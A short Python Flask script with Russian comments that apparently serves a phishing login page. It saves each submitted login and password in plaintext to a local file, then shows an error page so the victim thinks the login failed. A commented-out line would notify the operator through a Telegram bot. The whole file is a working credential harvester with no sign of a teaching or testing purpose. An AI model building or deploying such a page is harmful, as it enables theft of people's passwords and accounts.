from flask import Flask, request, render_template
import time
app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        # Получаем данные из формы
        login = request.form.get("login")
        password = request.form.get("password")
      # bot.send_message(5678859030, 'registration!')

        # Сохраняем данные в файл
        with open("data.txt", "a") as file:
            file.write(f"Логин: {login}, Пароль: {password}\n")
        
        # Переходим на страницу с сообщением
        time.sleep(3)
        return render_template("error.html")
    
    # Если GET-запрос, возвращаем HTML-страницу
    return render_template("index.html")

if __name__ == "__main__":
    app.run(debug=True)